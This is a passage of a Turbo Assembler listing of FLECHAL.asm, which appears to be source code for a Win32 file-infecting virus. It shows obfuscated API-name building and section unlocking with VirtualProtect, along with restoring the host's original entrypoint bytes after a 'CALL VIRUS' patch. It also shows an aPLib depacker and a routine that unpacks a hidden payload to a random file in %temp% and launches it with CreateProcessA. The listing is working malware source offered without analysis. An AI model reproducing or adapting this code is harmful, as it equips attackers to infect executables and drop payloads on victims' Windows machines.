4  5323	00002A0F  81 F6	081F131A				 xor	 esi, _reg xor j
4  5324	00002A15  56						 push	 esi
3  5325									 x_push_next q,esi,j
4  5326	00002A16  81 EE	D70F0121				 sub	 esi, _reg - j
4  5327	00002A1C  56						 push	 esi
3  5328									 x_push_next q,esi,j
4  5329	00002A1D  81 F6	06043353				 xor	 esi, _reg xor j
4  5330	00002A23  56						 push	 esi
3  5331									 x_push_next q,esi,j
4  5332	00002A24  81 C6	CD0E2C65				 add	 esi, j	- _reg
4  5333	00002A2A  56						 push	 esi
3  5334									 x_push_next q,esi,j
4  5335	00002A2B  81 F6	221C0135				 xor	 esi, _reg xor j
4  5336	00002A31  56						 push	 esi
3  5337									 x_push_next q,esi,j
4  5338	00002A32  81 EE	FDFB10EB				 sub	 esi, _reg - j
4  5339	00002A38  56						 push	 esi
3  5340									 x_push_next q,esi,j
4  5341	00002A39  81 F6	17376124				 xor	 esi, _reg xor j
4  5342	00002A3F  56						 push	 esi
3  5343									 x_push_next q,esi,j
4  5344	00002A40  81 C6	F32A610D				 add	 esi, j	- _reg
4  5345	00002A46  56						 push	 esi
3  5346									 x_push_next q,esi,j
4  5347	00002A47  81 F6	00010808				 xor	 esi, _reg xor j
4  5348	00002A4D  56						 push	 esi
3  5349									 x_push_next q,esi,j
4  5350	00002A4E  81 EE	F4FF03F2				 sub	 esi, _reg - j
4  5351	00002A54  56						 push	 esi
3  5352									 x_push_next q,esi,j
4  5353	00002A55  81 F6	04082254				 xor	 esi, _reg xor j
4  5354	00002A5B  56						 push	 esi
3  5355									 x_push_next q,esi,j
4  5356	00002A5C  81 C6	CD032D61				 add	 esi, j	- _reg
4  5357	00002A62  56						 push	 esi
3  5358									 x_push_next q,esi,j
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 95
FLECHAL.asm



4  5359	00002A63  81 F6	11181904				 xor	 esi, _reg xor j
4  5360	00002A69  56						 push	 esi
3  5361									 x_push_next q,esi,j
4  5362	00002A6A  81 EE	FBFC081E				 sub	 esi, _reg - j
4  5363	00002A70  56						 push	 esi
3  5364									 x_push_next q,esi,j
4  5365	00002A71  81 F6	54351D22				 xor	 esi, _reg xor j
4  5366	00002A77  56						 push	 esi
3  5367									 x_push_next q,esi,j
4  5368	00002A78  81 C6	7433D509				 add	 esi, j	- _reg
4  5369	00002A7E  56						 push	 esi
3  5370									 x_push_next q,esi,j
4  5371	00002A7F  81 F6	1105026E				 xor	 esi, _reg xor j
4  5372	00002A85  56						 push	 esi
3  5373									 x_push_next q,esi,j
4  5374	00002A86  81 EE	F10CE98C				 sub	 esi, _reg - j
4  5375	00002A8C  56						 push	 esi
3  5376									 x_push_next q,esi,j
4  5377	00002A8D  81 F6	1B113518				 xor	 esi, _reg xor j
4  5378	00002A93  56						 push	 esi
3  5379									 x_push_next q,esi,j
4  5380	00002A94  81 C6	F2032406				 add	 esi, j	- _reg
4  5381	00002A9A  56						 push	 esi
3  5382									 x_push_next q,esi,j
4  5383	00002A9B  81 F6	08237417				 xor	 esi, _reg xor j
4  5384	00002AA1  56						 push	 esi
3  5385									 x_push_next q,esi,j
4  5386	00002AA2  81 EE	FCF19204				 sub	 esi, _reg - j
4  5387	00002AA8  56						 push	 esi
3  5388									 x_push_next q,esi,j
4  5389	00002AA9  81 F6	24011D0E				 xor	 esi, _reg xor j
4  5390	00002AAF  56						 push	 esi
3  5391									 x_push_next q,esi,j
4  5392	00002AB0  81 C6	23DD8CF6				 add	 esi, j	- _reg
4  5393	00002AB6  56						 push	 esi
3  5394									 x_push_next q,esi,j
4  5395	00002AB7  81 F6	002A4600				 xor	 esi, _reg xor j
4  5396	00002ABD  56						 push	 esi
3  5397									 x_push_next q,esi,j
4  5398	00002ABE  81 EE	F7FFD40E				 sub	 esi, _reg - j
4  5399	00002AC4  56						 push	 esi
3  5400									 x_push_next q,esi,j
4  5401	00002AC5  81 F6	7428173B				 xor	 esi, _reg xor j
4  5402	00002ACB  56						 push	 esi
3  5403									 x_push_next q,esi,j
4  5404	00002ACC  81 C6	69050008				 add	 esi, j	- _reg
4  5405	00002AD2  56						 push	 esi
3  5406									 x_push_next q,esi,j
4  5407	00002AD3  81 F6	08231737				 xor	 esi, _reg xor j
4  5408	00002AD9  56						 push	 esi
1  5409	00002ADA  8B F4						 mov esi, esp
   5410
   5411	00002ADC  83 EC	2C		    sub	esp, (offset _api_addr_end - offset _api_addr_ini)
   5412	00002ADF  8B FC			    mov	edi, esp
   5413	00002AE1  B9 0000000B		    mov	ecx, (offset _api_addr_end - offset _api_addr_ini)/4
   5414	00002AE6  51			    push ecx
   5415
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 96
FLECHAL.asm



   5416	00002AE7			    _api_index_1:
   5417
   5418	00002AE7  51			    push ecx
   5419	00002AE8  56			    push esi
   5420	00002AE9  53			    push ebx
   5421	00002AEA  FF 15	000029ACr	    call dword ptr [l_start]
   5422		  =FLAT:2AEC		    _import_GetProcAddress  equ	dword ptr $-4
   5423
   5424	00002AF0  59			    pop	ecx
   5425	00002AF1  AB			    stosd
   5426
   5427	00002AF2			    _api_index_2:
   5428
   5429	00002AF2  AC			    lodsb
   5430	00002AF3  84 C0			    test al, al
   5431	00002AF5  75 FB			    jnz	_api_index_2
   5432	00002AF7  E2 EE			    loop _api_index_1
   5433
   5434	00002AF9  8D 77	D4		    lea	esi, [edi-(offset _api_addr_end	- offset _api_addr_ini)]
   5435	00002AFC  8D BD	0000028F	    lea	edi, [ebp+(offset _api_addr_ini	- offset delta)]
   5436
   5437					    ;  we've all api's to use
   5438
   5439					    ;  unlocking loader's section to use it
   5440
   5441	00002B02  8D 85	0000017A	    lea	eax, [ebp+(offset pfdwOldProtect - offset delta)]
   5442	00002B08  50			    push eax
   5443	00002B09  6A 40			    push PAGE_EXECUTE_READWRITE
   5444	00002B0B  FF B5	0000017E	    push dword ptr [ebp+(offset	_section_size -	offset delta)]	;  size	size
   5445	00002B11  E8 00000279		    call _loader_section_src
   5446	00002B16  50			    push eax
   5447	00002B17  FF 56	0C		    call [esi+(offset _VirtualProtect -	offset _api_addr_ini)]
   5448
   5449	00002B1A  59			    pop	ecx
   5450
   5451					    ;  copying api's address from stack	to body
   5452
   5453	00002B1B  F3> A5		    rep	movsd
   5454	00002B1D  83 EC	D4		    sub	esp, -(offset _api_addr_end - offset _api_addr_ini)
   5455					    x_pop
1  5456	00002B20  8D A4	24 00000090				 lea	 esp, [esp + _xsize]
   5457
   5458	00002B27  8B 85	000002BB	    mov	eax, [ebp+(offset l_size - offset delta)]
   5459	00002B2D  89 85	000001D1	    mov	[ebp+(offset _compressed_code_place - offset delta)], eax
   5460
   5461	00002B33  B0 00			    mov	al, ?
   5462		  =FLAT:2B34		    _infect_mode_1 equ byte ptr	$-1
   5463	00002B35  84 C0			    test al, al
   5464	00002B37  0F 84	000000CF	    jz _mode_loader_0 ;	 0
   5465	00002B3D  FE C8			    dec	al
   5466	00002B3F  0F 84	000000C7	    jz _mode_loader_0 ;	 1
   5467	00002B45  FE C8			    dec	al
   5468	00002B47  0F 84	00000135	    jz _mode_loader_2 ;	 2
   5469	00002B4D  FE C8			    dec	al
   5470					 ;   jz	_mode_loader_3 ;  3
   5471
   5472	00002B4F  E9 000000B8		 jmp _mode_loader_0
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 97
FLECHAL.asm



   5473
   5474					    include DEPACKER.INC
1  5475					    ;***************************************************************
1  5476					    ;*	       aPLib v0.22b  -	the smaller the	better :)	   *
1  5477					    ;*		     WASM & TASM assembler depacker		   *
1  5478					    ;*								   *
1  5479					    ;*	 Copyright (c) 1998-99 by  - Jibz -  All Rights	Reserved   *
1  5480					    ;***************************************************************
1  5481
1  5482	00002B54			    _aP_depack_asm:
1  5483
1  5484	00002B54  55			    push   ebp
1  5485	00002B55  8B EC			    mov	   ebp,	esp
1  5486	00002B57  60			    pushad
1  5487	00002B58  55			    push   ebp
1  5488	00002B59  8B 75	08		    mov	   esi,	[ebp + 8]     ;	C calling convention
1  5489	00002B5C  8B 7D	0C		    mov	   edi,	[ebp + 12]
1  5490	00002B5F  FC			    cld
1  5491	00002B60  B2 80			    mov	   dl, 80h
1  5492
1  5493	00002B62			    literal:
1  5494
1  5495	00002B62  A4			    movsb
1  5496
1  5497	00002B63			    nexttag:
1  5498
1  5499	00002B63  E8 0000006D		    call   getbit
1  5500	00002B68  73 F8			    jnc	   literal
1  5501
1  5502	00002B6A  33 C9			    xor	   ecx,	ecx
1  5503	00002B6C  E8 00000064		    call   getbit
1  5504	00002B71  73 19			    jnc	   codepair
1  5505	00002B73  33 C0			    xor	   eax,	eax
1  5506	00002B75  E8 0000005B		    call   getbit
1  5507	00002B7A  73 21			    jnc	   shortmatch
1  5508	00002B7C  B0 10			    mov	   al, 10h
1  5509
1  5510	00002B7E			    getmorebits:
1  5511
1  5512	00002B7E  E8 00000052		    call   getbit
1  5513	00002B83  12 C0			    adc	   al, al
1  5514	00002B85  73 F7			    jnc	   getmorebits
1  5515	00002B87  75 41			    jnz	   domatch_with_inc
1  5516	00002B89  AA			    stosb
1  5517	00002B8A  EB D7			    jmp	   short nexttag
1  5518
1  5519	00002B8C			    codepair:
1  5520
1  5521	00002B8C  E8 00000050		    call   getgamma_no_ecx
1  5522	00002B91  49			    dec	   ecx
1  5523	00002B92  E2 15			    loop   normalcodepair
1  5524	00002B94  8B C5			    mov	   eax,ebp
1  5525	00002B96  E8 00000044		    call   getgamma
1  5526	00002B9B  EB 2E			    jmp	   short domatch
1  5527
1  5528	00002B9D			    shortmatch:
1  5529
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 98
FLECHAL.asm



1  5530	00002B9D  AC			    lodsb
1  5531	00002B9E  D1 E8			    shr	   eax,	1
1  5532	00002BA0  74 4F			    jz	   donedepacking
1  5533	00002BA2  83 D1	02		    adc	   ecx,	2
1  5534	00002BA5  8B E8			    mov	   ebp,	eax
1  5535	00002BA7  EB 22			    jmp	   short domatch
1  5536
1  5537	00002BA9			    normalcodepair:
1  5538
1  5539	00002BA9  91			    xchg   eax,	ecx
1  5540	00002BAA  48			    dec	   eax
1  5541	00002BAB  C1 E0	08		    shl	   eax,	8
1  5542	00002BAE  AC			    lodsb
1  5543	00002BAF  8B E8			    mov	   ebp,	eax
1  5544	00002BB1  E8 00000029		    call   getgamma
1  5545	00002BB6  3D 00007D00		    cmp	   eax,	32000
1  5546	00002BBB  73 0C			    jae	   domatch_with_2inc
1  5547	00002BBD  3D 00000500		    cmp	   eax,	1280
1  5548	00002BC2  73 06			    jae	   domatch_with_inc
1  5549	00002BC4  83 F8	7F		    cmp	   eax,	7fh
1  5550	00002BC7  77 02			    ja	   domatch
1  5551
1  5552	00002BC9			    domatch_with_2inc:
1  5553
1  5554	00002BC9  41			    inc	   ecx
1  5555
1  5556	00002BCA			    domatch_with_inc:
1  5557
1  5558	00002BCA  41			    inc	   ecx
1  5559
1  5560	00002BCB			    domatch:
1  5561
1  5562	00002BCB  56			    push   esi
1  5563	00002BCC  8B F7			    mov	   esi,	edi
1  5564	00002BCE  2B F0			    sub	   esi,	eax
1  5565	00002BD0  F3> A4		    rep	   movsb
1  5566	00002BD2  5E			    pop	   esi
1  5567	00002BD3  EB 8E			    jmp	   short nexttag
1  5568
1  5569	00002BD5			    getbit:
1  5570
1  5571	00002BD5  02 D2			    add	    dl,	dl
1  5572	00002BD7  75 05			    jnz	    stillbitsleft
1  5573	00002BD9  8A 16			    mov	    dl,	[esi]
1  5574	00002BDB  46			    inc	    esi
1  5575	00002BDC  12 D2			    adc	    dl,	dl
1  5576
1  5577	00002BDE			    stillbitsleft:
1  5578
1  5579	00002BDE  C3			    ret
1  5580
1  5581	00002BDF			    getgamma:
1  5582
1  5583	00002BDF  33 C9			    xor	   ecx,	ecx
1  5584
1  5585	00002BE1			    getgamma_no_ecx:
1  5586
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 99
FLECHAL.asm



1  5587	00002BE1  41			    inc	   ecx
1  5588
1  5589	00002BE2			    getgammaloop:
1  5590
1  5591	00002BE2  E8 FFFFFFEE		    call   getbit
1  5592	00002BE7  13 C9			    adc	   ecx,	ecx
1  5593	00002BE9  E8 FFFFFFE7		    call   getbit
1  5594	00002BEE  72 F2			    jc	   getgammaloop
1  5595	00002BF0  C3			    ret
1  5596
1  5597	00002BF1			    donedepacking:
1  5598
1  5599	00002BF1  5D			    pop	   ebp
1  5600	00002BF2  2B 7D	0C		    sub	   edi,	[ebp + 12]
1  5601	00002BF5  89 7D	FC		    mov	   [ebp	- 4], edi     ;	return unpacked	length in eax
1  5602
1  5603	00002BF8  61			    popad
1  5604	00002BF9  5D			    pop	   ebp
1  5605	00002BFA  C2 0008		    ret	   (4*2)
1  5606
   5607
   5608	00002BFD			    delta:
   5609
   5610	00002BFD  E8			    db 0e8h
   5611	00002BFE  00000000		    dd 0
   5612	00002C02  5D			    pop	ebp
   5613	00002C03  83 ED	05		    sub	ebp, 5
   5614	00002C06  C3			    ret
   5615
   5616	00002C07  68 12345678		    push 12345678h
   5617		  =FLAT:2C08		    _mem_total equ dword ptr $-4
   5618
   5619	00002C0C			    _mode_loader_0:
   5620
   5621					    ;  before restore the bytes, we should
   5622					    ;  unlock the specified memory
   5623
   5624	00002C0C  E8 00000004		    call $+5+4
   5625	00002C11  00000000		    pfdwOldProtect_2 dd	0
   5626	00002C15  6A 40			    push PAGE_EXECUTE_READWRITE
   5627	00002C17  68 12345678		    push 12345678h
   5628		  =FLAT:2C18		    _replaced_api_section_sz   equ dword ptr $-4
   5629	00002C1C  E8 00000166		    call _replaced_api_section_src
   5630	00002C21  50			    push eax
   5631	00002C22  E8 00000130		    call _protect?
   5632
   5633					    ;  we've to	extract	the 5 original bytes from
   5634					    ;  the entrypoint
   5635					    ;  "CALL VIRUS"
   5636
   5637	00002C27  83 6C	24 24 05	    sub	dword ptr [esp+(4*8)+(4*1)], 5
   5638	00002C2C  8B 7C	24 24		    mov	edi, [esp+(4*8)+(4*1)]
   5639	00002C30  E8 00000005		    call $+5+5
   5640
   5641	00002C35  05*(00)		    _infect_orig_bytes	 db 5 dup(0)
   5642
   5643	00002C3A  5E			    pop	esi
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 100
FLECHAL.asm



   5644	00002C3B  A5			    movsd
   5645	00002C3C  A4			    movsb
   5646
   5647					    ;  retore the old access
   5648
   5649	00002C3D  E8 00000004		    call $+5+4
   5650	00002C42  00000000		    dd 0
   5651	00002C46  8D 45	14		    lea	eax, [ebp+(offset pfdwOldProtect_2 - offset delta)]
   5652	00002C49  FF 30			    push dword ptr [eax]
   5653	00002C4B  8D 45	1B		    lea	eax, [ebp+(offset _replaced_api_section_sz - offset delta)]
   5654	00002C4E  FF 30			    push dword ptr [eax]
   5655	00002C50  E8 00000132		    call _replaced_api_section_src
   5656	00002C55  50			    push eax
   5657	00002C56  E8 000000FC		    call _protect?
   5658
   5659					    ;  restoring the original section access
   5660
   5661	00002C5B  50			    push eax
   5662	00002C5C  54			    push esp
   5663	00002C5D  FF B5	0000017A	    push dword ptr [ebp+(offset	pfdwOldProtect - offset	delta)]
   5664	00002C63  FF B5	0000017E	    push dword ptr [ebp+(offset	_section_size -	offset delta)]	;  size
   5665	00002C69  E8 00000119		    call _replaced_api_section_src
   5666	00002C6E  50			    push eax
   5667	00002C6F  E8 000000E3		    call _protect?
   5668	00002C74  58			    pop	eax
   5669
   5670	00002C75  E8 000000B3		    call l_ok
   5671	00002C7A  E8 0000012F		    call _unpack_to_disk
   5672
   5673	00002C7F  61			    popad
   5674	00002C80  9D			    popf
   5675	00002C81  C3			    ret
   5676
   5677	00002C82			    _mode_loader_2:
   5678
   5679					    ;  copy all	this code to memory and	depack
   5680
   5681	00002C82  8B 45	0B		    mov	eax, [ebp+(offset _mem_total - offset delta)]
   5682	00002C85  50			    push eax
   5683	00002C86  83 C0	04		    add	eax, 4
   5684	00002C89  50			    push eax
   5685	00002C8A  6A 40			    push 40h
   5686	00002C8C  FF 95	000002B3	    call [ebp+(offset _GlobalAlloc - offset delta)]
   5687
   5688	00002C92  8B F8			    mov	edi, eax
   5689	00002C94  8D B5	FFFFFDAF	    lea	esi, [ebp+(offset l_start - offset delta)]
   5690	00002C9A  59			    pop	ecx
   5691	00002C9B  F3> A4		    rep	movsb
   5692
   5693	00002C9D  8D 8D	FFFFFDAF	    lea	ecx, [ebp+(offset l_start - offset delta)]
   5694	00002CA3  89 88	000003EA	    mov	dword ptr [eax+(offset __start_loader_runtime -	offset l_start)], ecx
   5695
   5696	00002CA9  8D 88	00000306	    lea	ecx, [eax+(offset _4 - offset l_start)]
   5697	00002CAF  FF D1			    call ecx
   5698
   5699	00002CB1  C3			    ret	  ;  never works
   5700
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 101
FLECHAL.asm



   5701	00002CB2			    _4:
   5702
   5703	00002CB2  E8 FFFFFF46		    call delta
   5704
   5705	00002CB7  50			    push eax
   5706	00002CB8  E8 000000C2		    call _loader_entry_point
   5707	00002CBD  8B F8			    mov	edi, eax
   5708
   5709	00002CBF  8D 95	FFFFFDAF	    lea	edx, [ebp+(offset l_start - offset delta)]
   5710	00002CC5  03 95	000002BB	    add	edx, [ebp+(offset l_size - offset delta)]
   5711
   5712	00002CCB  57			    push edi
   5713	00002CCC  52			    push edx
   5714
   5715	00002CCD  E8 00000004		    call $+5+4
   5716	00002CD2  00000000		    pfdwOldProtect_3 dd	0
   5717	00002CD6  6A 40			    push PAGE_EXECUTE_READWRITE
   5718	00002CD8  FF B5	0000017E	    push dword ptr [ebp+(offset	_section_size -	offset delta)]
   5719	00002CDE  E8 000000AC		    call _loader_section_src
   5720	00002CE3  50			    push eax
   5721	00002CE4  E8 0000006E		    call _protect?
   5722
   5723	00002CE9  E8 FFFFFE66		    call _aP_depack_asm
   5724
   5725	00002CEE  01 85	000001D1	    add	[ebp+(offset _compressed_code_place - offset delta)], eax
   5726
   5727	00002CF4  50			    push eax
   5728	00002CF5  54			    push esp
   5729	00002CF6  FF B5	000000D5	    push dword ptr [ebp+(offset	pfdwOldProtect_3 - offset delta)]
   5730	00002CFC  FF B5	0000017E	    push dword ptr [ebp+(offset	_section_size -	offset delta)]	;  size
   5731	00002D02  E8 00000088		    call _loader_section_src
   5732	00002D07  50			    push eax
   5733	00002D08  E8 0000004A		    call _protect?
   5734	00002D0D  58			    pop	eax
   5735
   5736	00002D0E  FF 95	000002B7	    call [ebp+(offset _GlobalFree - offset delta)]
   5737
   5738	00002D14  89 BD	0000012B	    mov	[ebp+(offset s_ret - offset delta)], edi
   5739
   5740	00002D1A  E8 0000000E		    call l_ok
   5741	00002D1F  E8 0000008A		    call _unpack_to_disk
   5742
   5743	00002D24  58			    pop	eax
   5744	00002D25  61			    popad
   5745	00002D26  9D			    popf
   5746
   5747	00002D27  68 12345678		    push 12345678h
   5748		  =FLAT:2D28		    s_ret equ dword ptr	$-4
   5749	00002D2C  C3			    ret
   5750
   5751	00002D2D			    l_ok:
   5752
   5753	00002D2D  60			    pushad
   5754					    x_push eax,	LOADER|OK~
1  5755								 x_push_first eax
2  5756	00002D2E  33 C0						 xor	 eax, eax
3  5757									 x_push_next q,eax,j
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 102
FLECHAL.asm



4  5758	00002D30  2D 8786FFB5					 sub	 eax, _reg - j
4  5759	00002D35  50						 push	 eax
3  5760									 x_push_next q,eax,j
4  5761	00002D36  35 3759520E					 xor	 eax, _reg xor j
4  5762	00002D3B  50						 push	 eax
3  5763									 x_push_next q,eax,j
4  5764	00002D3C  05 F520FD07					 add	 eax, j	- _reg
4  5765	00002D41  50						 push	 eax
1  5766	00002D42  8B C4						 mov eax, esp
   5767	00002D44  6A 00	50 50 6A 00	    push 0 eax eax 0
   5768	00002D4A  B8 BFF5412E		    mov	eax, MessageBox
   5769	00002D4F  FF D0			    call eax
   5770					    x_pop
1  5771	00002D51  8D 64	24 0C					 lea	 esp, [esp + _xsize]
   5772	00002D55  61			    popad
   5773	00002D56  C3			    ret
   5774
   5775	00002D57			    _protect?:
   5776
   5777	00002D57  55			    push ebp
   5778	00002D58  8B EC			    mov	ebp, esp
   5779	00002D5A  60			    pushad
   5780
   5781	00002D5B  FF 75	14		    push dword ptr [ebp+20] ;  pointer to pfdwOldProtect
   5782	00002D5E  FF 75	10		    push dword ptr [ebp+16] ;  PAGE_EXECUTE_READWRITE
   5783	00002D61  FF 75	0C		    push dword ptr [ebp+12] ;  section_sz
   5784	00002D64  FF 75	08		    push dword ptr [ebp+08] ;  section_off
   5785
   5786	00002D67  E8 FFFFFE91		    call delta
   5787
   5788	00002D6C  FF 95	0000029B	    call [ebp+(offset _VirtualProtect -	offset delta)]
   5789
   5790	00002D72  61			    popad
   5791	00002D73  5D			    pop	ebp
   5792	00002D74  C2 0010		    ret	(4*4)
   5793
   5794	00002D77  00000000		    pfdwOldProtect dd 0
   5795	00002D7B  00000000		    _section_size  dd 0
   5796
   5797	00002D7F			    _loader_entry_point:
   5798
   5799	00002D7F  51			    push ecx
   5800	00002D80  B8 12345678		    mov	eax, 12345678h
   5801
   5802					    ;  RVA
   5803
   5804		  =FLAT:2D81		    __entry   equ dword	ptr $-4
   5805
   5806	00002D85  EB 0E			    jmp	.32
   5807
   5808	00002D87			    _replaced_api_section_src:
   5809
   5810	00002D87  51			    push ecx
   5811	00002D88  B8 12345678		    mov	eax, 12345678h
   5812
   5813					    ;  RVA
   5814
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 103
FLECHAL.asm



   5815		  =FLAT:2D89		    _replaced_api_section   equ	dword ptr $-4
   5816
   5817	00002D8D  EB 06			    jmp	.32
   5818
   5819	00002D8F			    _loader_section_src:
   5820
   5821					    ;  we can be in a .DLL file
   5822					    ;  so let's	calc. the true address
   5823
   5824	00002D8F  51			    push ecx
   5825	00002D90  B8 12345678		    mov	eax, 12345678h
   5826
   5827					    ;  RVA
   5828
   5829		  =FLAT:2D91		    _loader_memory_protect? equ	dword ptr $-4
   5830
   5831	00002D95			    .32:
   5832
   5833	00002D95  B9			    db 0b9h  ;	mov ecx, 0
   5834	00002D96  00000000		    __start_loader_runtime dd 0
   5835
   5836	00002D9A  85 C9			    test ecx, ecx
   5837	00002D9C  75 06			    jnz	.34
   5838
   5839	00002D9E  8D 8D	FFFFFDAF	    lea	ecx, [ebp+(offset l_start - offset delta)]
   5840
   5841	00002DA4			    .34:
   5842
   5843	00002DA4  81 E9	12345678	    sub	ecx, 12345678h
   5844
   5845					    ;  RVA virus
   5846
   5847		  =FLAT:2DA6		    _loader_memory_protect?_dif	equ dword ptr $-4
   5848
   5849					    ;  IMAGEBASE in ECX
   5850
   5851	00002DAA  03 C1			    add	eax, ecx
   5852	00002DAC  59			    pop	ecx
   5853
   5854	00002DAD  C3			    ret
   5855
   5856	00002DAE			    _unpack_to_disk:
   5857
   5858					    ;  alloc memory
   5859					    ;  depack file in it
   5860					    ;  choose random name
   5861					    ;  create file in %temp%
   5862					    ;  play it
   5863
   5864	00002DAE  60			    pushad
   5865	00002DAF  68 00010000		    push 64 * 1024
   5866	00002DB4  6A 40			    push 40h
   5867	00002DB6  FF 95	000002B3	    call [ebp+(offset _GlobalAlloc - offset delta)]
   5868
   5869	00002DBC  85 C0			    test eax, eax
   5870	00002DBE  0F 84	000000C1	    jz _unpack_to_disk_error
   5871
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 104
FLECHAL.asm



   5872	00002DC4  8B F8			    mov	edi, eax
   5873	00002DC6  8D B5	FFFFFDAF	    lea	esi, [ebp+(offset l_start - offset delta)]
   5874	00002DCC  81 C6	12345678	    add	esi, 12345678h
   5875		  =FLAT:2DCE		    _compressed_code_place equ dword ptr $-4
   5876
   5877	00002DD2  57			    push edi
   5878	00002DD3  56			    push esi
   5879	00002DD4  E8 FFFFFD7B		    call _aP_depack_asm
   5880
   5881	00002DD9  81 EC	00000104	    sub	esp, MAX_PATH
   5882	00002DDF  8B DC			    mov	ebx, esp
   5883
   5884	00002DE1  50			    push eax ;	unpacked code lenght
   5885
   5886	00002DE2  53			    push ebx
   5887	00002DE3  68 00000103		    push MAX_PATH - 1
   5888	00002DE8  FF 95	000002A3	    call [ebp+(offset _GetTempPathA - offset delta)]
   5889
   5890	00002DEE  85 C0			    test eax, eax
   5891	00002DF0  0F 84	00000088	    jz _unpack_to_disk_error_1
   5892
   5893	00002DF6  B8 12345678		    mov	eax, 12345678h
   5894		  =FLAT:2DF7		    _loader_fixed_random_value equ dword ptr $-4
   5895	00002DFB  8B C8			    mov	ecx, eax
   5896	00002DFD  25 000F0F0F		    and	eax, 0f0f0fh
   5897	00002E02  05 004E4957		    add	eax, 'NIW'
   5898	00002E07  50			    push eax
   5899	00002E08  8B C4			    mov	eax, esp
   5900
   5901	00002E0A  53			    push ebx
   5902	00002E0B  51			    push ecx
   5903	00002E0C  50			    push eax
   5904	00002E0D  53			    push ebx
   5905	00002E0E  FF 95	000002A7	    call [ebp+(offset _GetTempFileNameA	- offset delta)]
   5906
   5907	00002E14  85 C0			    test eax, eax
   5908	00002E16  58			    pop	eax
   5909	00002E17  74 65			    jz _unpack_to_disk_error_1
   5910
   5911	00002E19  33 C0			    xor	eax, eax
   5912	00002E1B  50			    push eax
   5913	00002E1C  50			    push eax
   5914	00002E1D  6A 02			    push 2   ;	 CREATE_ALWAYS
   5915	00002E1F  50			    push eax
   5916	00002E20  40			    inc	eax
   5917	00002E21  50			    push eax
   5918	00002E22  68 C0000000		    push GENERIC_READ or GENERIC_WRITE
   5919	00002E27  53			    push ebx
   5920	00002E28  FF 95	0000028F	    call [ebp+(offset _CreateFileA - offset delta)]
   5921
   5922	00002E2E  8B F0			    mov	esi, eax
   5923	00002E30  33 C0			    xor	eax, eax
   5924	00002E32  50			    push eax
   5925	00002E33  8B CC			    mov	ecx, esp
   5926
   5927	00002E35  50			    push eax
   5928	00002E36  51			    push ecx
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 105
FLECHAL.asm



   5929	00002E37  FF 74	24 0C		    push dword ptr [esp+(4*3)]
   5930	00002E3B  57			    push edi
   5931	00002E3C  56			    push esi
   5932	00002E3D  FF 95	00000293	    call [ebp+(offset _WriteFile - offset delta)]
   5933	00002E43  59			    pop	ecx
   5934
   5935	00002E44  56			    push esi
   5936	00002E45  FF 95	00000297	    call [ebp+(offset _CloseHandle - offset delta)]
   5937
   5938	00002E4B  57			    push edi
   5939	00002E4C  FF 95	000002B7	    call [ebp+(offset _GlobalFree - offset delta)]
   5940
   5941					    ;  Getting some basic info.
   5942
   5943	00002E52  83 EC	50		    sub	esp, 80
   5944	00002E55  8B FC			    mov	edi, esp
   5945	00002E57  57			    push edi
   5946	00002E58  FF 95	000002AF	    call [ebp+(offset _GetStartupInfoA - offset	delta)]
   5947
   5948					    ;  Little boy spawned, let's play it
   5949
   5950	00002E5E  83 EC	14		    sub	esp, 20
   5951	00002E61  54			    push esp
   5952	00002E62  57			    push edi
   5953	00002E63  33 C0			    xor	eax, eax
   5954	00002E65  50			    push eax
   5955	00002E66  50			    push eax
   5956	00002E67  6A 20			    push 20h   ;   NORMAL_PRIORITY_CLASS
   5957	00002E69  50			    push eax
   5958	00002E6A  50			    push eax
   5959	00002E6B  50			    push eax
   5960	00002E6C  50			    push eax
   5961	00002E6D  53			    push ebx
   5962	00002E6E  FF 95	000002AB	    call [ebp+(offset _CreateProcessA -	offset delta)]
   5963	00002E74  83 EC	9C		    sub	esp, -(80 + 20)
   5964	00002E77  C7 04	24 00000001	    mov	dword ptr [esp], 1
   5965
   5966	00002E7E			    _unpack_to_disk_error_1:
   5967
   5968	00002E7E  58			    pop	eax
   5969	00002E7F  81 EC	FFFFFEFC	    sub	esp, - MAX_PATH
   5970
   5971	00002E85			    _unpack_to_disk_error:
   5972
   5973	00002E85  48			    dec	eax
   5974	00002E86  89 44	24 1C		    mov	[esp+(4*7)], eax
   5975	00002E8A  61			    popad
   5976	00002E8B  C3			    ret
   5977
   5978	00002E8C			    _api_addr_ini  label
   5979
   5980	00002E8C  00000000		    _CreateFileA dd 0
   5981	00002E90  00000000		    _WriteFile dd 0
   5982	00002E94  00000000		    _CloseHandle dd 0
   5983	00002E98  00000000		    _VirtualProtect dd 0
   5984	00002E9C  00000000		    _OpenMutexA	dd 0
   5985	00002EA0  00000000		    _GetTempPathA dd 0
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 106
FLECHAL.asm



   5986	00002EA4  00000000		    _GetTempFileNameA dd 0
   5987	00002EA8  00000000		    _CreateProcessA dd 0
   5988	00002EAC  00000000		    _GetStartupInfoA dd	0
   5989	00002EB0  00000000		    _GlobalAlloc dd 0
   5990	00002EB4  00000000		    _GlobalFree	dd 0
   5991
   5992	00002EB8			    _api_addr_end  label
   5993
   5994	00002EB8  00000000		    l_size   dd	0  ;  loader size
   5995
   5996					    align 4
   5997
   5998	00002EBC			    l_end label
   5999
   6000	00002EBC  BFF5412E		    MessageBoxA	dd 0BFF5412Eh
   6001		  =BFF5412E		    MessageBox = 0BFF5412Eh
   6002
   6003	00002EC0			    aplib@006 label
   6004
   6005	00002EC0  F2 F5	F2 F5 9E AF B3+	    db not 00dh, not 00ah, not 00dh, not 00ah, not 061h, not 050h, not 04ch, not 069h, not  +
   6006		  96 9D	DF 89 CF D1 CD+	 062h, not 020h, not 076h, not 030h, not 02eh, not 032h, not 032h, not 062h
   6007		  CD 9D
   6008	00002ED0  DF DF	D2 DF DF 8B 97+	    db not 020h, not 020h, not 02dh, not 020h, not 020h, not 074h, not 068h, not 065h, not  +
